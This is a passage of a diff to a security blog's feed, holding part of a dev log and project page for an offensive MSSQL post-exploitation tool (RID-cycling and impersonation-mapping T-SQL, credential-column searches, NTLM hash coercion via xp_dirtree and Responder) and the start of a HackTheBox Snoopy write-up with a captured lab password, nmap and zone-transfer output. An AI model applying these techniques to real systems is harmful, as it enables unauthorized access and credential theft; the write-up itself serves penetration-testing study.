+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;CONVERT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;VARBINARY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;65536&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;CONVERT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;VARBINARY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16777216&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;These bytes are appended back onto the base Domain SID on the fly. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUSER_SNAME()&lt;/code&gt; then evaluates the synthetic binary block, translating valid strings into clear-text usernames.&lt;/p&gt;
+
+&lt;p&gt;To prevent execution failures or SQL execution timeouts during massive range brute-forcing, we also implemented the parameterized &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--rid&lt;/code&gt; command-line flag backed by a strict Bash regex engine (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;^[0-9]+$&lt;/code&gt;) to validate safe integer bounds before passing queries over the wire.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;mapping-the-backdoors-impersonation-path-analysis-phase-11&quot;&gt;Mapping the Backdoors: Impersonation Path Analysis (Phase 11)&lt;/h3&gt;
+
+&lt;p&gt;Identity isolation inside an MSSQL instance is frequently broken by misconfigured explicit permissions. If a login possesses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IMPERSONATE&lt;/code&gt; grant over another high-privilege principal (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sa&lt;/code&gt;), an attacker can instantly assume their context via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EXECUTE AS LOGIN&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Phase 11 introduces granular mapping of the internal delegation topology by joining &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys.server_permissions&lt;/code&gt; against underlying security identifiers:&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grantee&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Grantee_User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;permission_name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Permission_Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Target_Identity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; 
+&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server_permissions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perm&lt;/span&gt; 
+&lt;span class=&quot;k&quot;&gt;JOIN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server_principals&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grantee&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;grantee_principal_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grantee&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;principal_id&lt;/span&gt; 
+&lt;span class=&quot;k&quot;&gt;JOIN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server_principals&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;major_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;principal_id&lt;/span&gt; 
+&lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;permission_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;IMPERSONATE&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This output automatically surfaces multi-stage, transitive paths where a low-privilege account can jump to a medium-privilege service account, which in turn holds execution rights over a local administrator rendering nested lateral movement vectors visible at a glance.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;autonomous-loot-auditing-targeted-data-classification-phase-12&quot;&gt;Autonomous Loot Auditing: Targeted Data Classification (Phase 12)&lt;/h3&gt;
+
+&lt;p&gt;Manual schema parsing across complex enterprise database instances consumes vast amounts of operational time. Phase 12 implements a fast, non-intrusive keyword profiler running directly against metadata boundaries.&lt;/p&gt;
+
+&lt;p&gt;Using recursive lookups in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INFORMATION_SCHEMA.COLUMNS&lt;/code&gt;, the script screens every table across the currently mapped database context for high-yield schema identifiers, searching for matching strings like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%pass%&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%cred%&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%secret%&lt;/code&gt;, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%token%&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;This enables rapid targeting of configuration blocks, Web API integration backends, and poorly hashed application password stores without needing to pull down massive, unparsed table dumps over the network connection.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;whats-next&quot;&gt;What’s Next?&lt;/h3&gt;
+
+&lt;p&gt;With the local enumeration, coercion vectors, and Active Directory indexing layers stabilized, development is pivoting toward cross-instance scaling. The next milestones on the roadmap include multi-threaded concurrent targeting loops and automated JSON reporting output for programmatic pipeline consumption.&lt;/p&gt;
+</content>
+  </entry>
+  
+  <entry>
+    <title>EnumMSSQL</title>
+    
+    <link href="http://localhost:4000/projects/enummssql/"/>
+    <updated>2026-05-17T00:00:00+02:00</updated>
+    <id>http://localhost:4000/projects/enummssql/</id>
+
+    
+    
+      <category term="Dossier" label="Project" />
+    
+    
+    <content type="html">&lt;p&gt;EnumMSSQL is a weaponized, standalone post-exploitation wrapper engineered in Bash to automate the entire MSSQL enumeration and lateral movement lifecycle. Moving far beyond generic script execution, it abstracts away complex T-SQL constraints to provide zero-dependency database auditing, localized pre-flight socket management, and multi-vector hash coercion. Its signature mechanic relies on mathematical, language-agnostic Active Directory user harvesting by establishing an immutable cryptographic anchor inside the target environment.&lt;/p&gt;
+
+&lt;h3 id=&quot;core-architecture&quot;&gt;Core Architecture&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Pre-Flight &amp;amp; Interface Engine:&lt;/strong&gt; Implements advanced TTY terminal self-healing (stty sane/onlcr) alongside a proactive local socket auditor that scans, maps, and terminates conflicting processes on ports 80, 443, and 445 to guarantee a pristine execution layer.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Coercion &amp;amp; Listener Layer:&lt;/strong&gt; Chains standalone extended stored procedures (xp_dirtree, xp_subdirs, xp_fileexist) across multiple egress vectors—specifically leveraging WebDAV port 80 encapsulation—to slip past standard enterprise firewall rules while managing an automated background instance of Responder.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Enumeration Engine:&lt;/strong&gt; Integrates a flawless three-step mathematical query utilizing a recursive Common Table Expression (CTE) loop and bit-shifting logic to reconstruct Little-Endian Windows SIDs, allowing raw user harvesting entirely over low-privilege database connections.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;-project-transmissions-dev-logs&quot;&gt;» Project Transmissions (Dev Logs)&lt;/h3&gt;
+&lt;p&gt;The following logs document the development milestones, research breakthroughs, and technical hurdles encountered during the EnumMSSQL lifecycle.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;ID&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Case Title&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Focus&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Status&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Date&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/projects/enummssql/2026-05-17-log-001/&quot;&gt;&lt;strong&gt;#001&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;/projects/enummssql/2026-05-17-log-001/&quot;&gt;&lt;strong&gt;Weaponizing T-SQL – Language-Agnostic RID Cycling and Transitive Impersonation&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AD Enumeration / Identity Mapping&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;STABLE&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;2026-05-17&lt;/strong&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;technical-roadmap&quot;&gt;Technical Roadmap&lt;/h3&gt;
+&lt;ul class=&quot;task-list&quot;&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Pre-flight port audit and automation interface.&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Multi-vector NTLM capture via WebDAV port 80 bypass strings.&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Undocumented procedure abstraction (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sp_MSforeachdb&lt;/code&gt; / &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sp_MSforeachtable&lt;/code&gt;) for global data dumping.&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Language-agnostic Active Directory enumeration via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;krbtgt&lt;/code&gt; base SID calculation.&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Parameterized –rid scope management with explicit regex input evaluation.&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; /&gt;Implement multi-threaded parallel execution across massive IP ranges.&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; /&gt;Integrate deep-nested recursive parsing for automated impersonation chain execution paths.&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; /&gt;Add standalone JSON export capabilities for programmatic post-processing pipelines.&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+  </entry>
+  
+  <entry>
     <title>HackTheBox: Snoopy</title>
     
     <link href="http://localhost:4000/ctfs/htb-snoopy/"/>
@@ -3466,56 +4122,1011 @@ hr {
       <category term="Mission Log" label="CTF" />
     
     
-    <content type="html">&lt;p&gt;Coming soon.&lt;/p&gt;
-</content>
-  </entry>
-  
-  <entry>
-    <title>HackTheBox: Ghost</title>
-    
-    <link href="http://localhost:4000/ctfs/htb-ghost/"/>
-    <updated>2026-05-15T00:00:00+02:00</updated>
-    <id>http://localhost:4000/ctfs/htb-ghost/</id>
+    <content type="html">&lt;h1 id=&quot;-snoopy&quot;&gt;🎯 Snoopy&lt;/h1&gt;
 
-    
-    
-      <category term="Mission Log" label="CTF" />
-    
-    
-    <content type="html">&lt;p&gt;Coming soon.&lt;/p&gt;
-</content>
-  </entry>
-  
-  <entry>
-    <title>HackTheBox: Redelegate</title>
-    
-    <link href="http://localhost:4000/ctfs/htb-redelegate/"/>
-    <updated>2026-05-14T00:00:00+02:00</updated>
-    <id>http://localhost:4000/ctfs/htb-redelegate/</id>
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;strong&gt;OS:&lt;/strong&gt; Linux&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;Difficulty:&lt;/strong&gt; Hard&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;IP:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.129.229.5&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
-    
-    
-      <category term="Mission Log" label="CTF" />
-    
-    
-    <content type="html">&lt;p&gt;Coming soon.&lt;/p&gt;
-</content>
-  </entry>
-  
-  <entry>
-    <title>HackTheBox: Craft</title>
-    
-    <link href="http://localhost:4000/ctfs/htb-craft/"/>
-    <updated>2026-05-14T00:00:00+02:00</updated>
-    <id>http://localhost:4000/ctfs/htb-craft/</id>
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-htb.png&quot; alt=&quot;snoopy.htb&quot; /&gt;&lt;/p&gt;
 
-    
-    
-      <category term="Mission Log" label="CTF" />
-    
-    
-    <content type="html">&lt;p&gt;Coming soon.&lt;/p&gt;
+&lt;hr /&gt;
 
+&lt;h2 id=&quot;️-tldr--attack-chain&quot;&gt;⛓️ TL;DR / Attack Chain&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Foothold:&lt;/strong&gt; LFI via Zip Download -&amp;gt; BIND DNS Config Read -&amp;gt; DNS Zone Hijack -&amp;gt; SMTP Interception &amp;amp; Password Reset -&amp;gt; Mattermost Server Provisioning Callback -&amp;gt; SSH Honeypot Credential Capture.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;PrivEsc:&lt;/strong&gt; Sudo git apply -&amp;gt; CVE-2023-23946 (Git Symlink Arbitrary File Write) -&amp;gt; Sudo clamscan –debug -&amp;gt; CVE-2023-20052 (ClamAV DMG XXE Info Leak) -&amp;gt; Root.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;-loot--creds&quot;&gt;🔑 Loot &amp;amp; Creds&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;User&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Credential&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Where / How&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cbrown&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sn00pedc13dential!!!&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Captured in plaintext using a custom Python Paramiko SSH honeypot on port 2222 during an automated server provisioning hook callback.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;-0-setup--global-variables&quot;&gt;🔧 0. Setup &amp;amp; Global Variables&lt;/h2&gt;
+&lt;p&gt;&lt;em&gt;Run this in your terminal once so you can copy-paste the rest of the commands blindly.&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ IP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.129.229.5&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;DOMAIN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;snoopy.htb&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sudo tee&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;-1-enumeration&quot;&gt;🔍 1. Enumeration&lt;/h2&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; nmap &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; ./nmap/nmap
+Starting Nmap 7.99 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2026-05-16 12:09 +0200
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;snoopy.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.229.5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.030s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65532 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| dns-nsid:
+|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
+80/tcp open  http    nginx 1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: SnoopySec Bootstrap Template - Index
+|_http-server-header: nginx/1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;46.45 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;dns53&quot;&gt;DNS/53&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig axfr @snoopy.htb snoopy.htb
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.20.22-1-Debian &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; axfr @snoopy.htb snoopy.htb
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 server found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
+snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
+snoopy.htb.		86400	IN	NS	ns1.snoopy.htb.
+snoopy.htb.		86400	IN	NS	ns2.snoopy.htb.
+mattermost.snoopy.htb.	86400	IN	A	172.18.0.3
+mm.snoopy.htb.		86400	IN	A	127.0.0.1
+ns1.snoopy.htb.		86400	IN	A	10.0.50.10
+ns2.snoopy.htb.		86400	IN	A	10.0.51.10
+postgres.snoopy.htb.	86400	IN	A	172.18.0.2
+provisions.snoopy.htb.	86400	IN	A	172.18.0.4
+www.snoopy.htb.		86400	IN	A	127.0.0.1
+snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Query &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 28 msec
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; SERVER: 10.129.229.5#53&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;snoopy.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; WHEN: Sat May 16 12:10:40 CEST 2026
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; XFR size: 11 records &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;messages 1, bytes 325&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Add all of these subdomains to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;. The entry should look like this:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;10.129.229.5     snoopy.htb mattermost.snoopy.htb mm.snoopy.htb postgres.snoopy.htb provisions.snoopy.htb www.snoopy.htb ns1.snoopy.htb ns2.snoopy.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;http80&quot;&gt;HTTP/80&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-1.png&quot; alt=&quot;snoopy-1.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/name/image-SJ6cplq0.png&quot; alt=&quot;image-SJ6cplq0.png&quot; /&gt;{idth=”auto”}&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://snoopy.htb/download?file=announcement.pdf&lt;/code&gt; generted the following zip:&lt;/p&gt;
